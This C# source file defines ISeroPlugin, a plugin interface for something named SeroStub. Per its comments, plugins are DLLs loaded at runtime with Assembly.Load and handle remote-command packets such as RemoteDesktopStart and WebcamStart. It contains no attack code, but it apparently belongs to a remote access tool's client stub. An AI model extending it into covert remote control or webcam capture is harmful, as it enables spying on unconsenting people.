namespace SeroStub;

/// <summary>
/// Interface that all Sero plugins must implement.
/// Plugins are .NET DLLs loaded at runtime via Assembly.Load (SingleFile mode only).
/// </summary>
public interface ISeroPlugin : IDisposable
{
    /// <summary>Display name of the plugin.</summary>
    string Name { get; }

    /// <summary>Packet types this plugin handles (e.g. RemoteDesktopStart, WebcamStart).</summary>
    int[] HandledTypes { get; }

    /// <summary>Called when a matching packet arrives.</summary>
    Task HandleAsync(int packetType, string data, Func<int, string, Task> sendBack, CancellationToken ct);
}
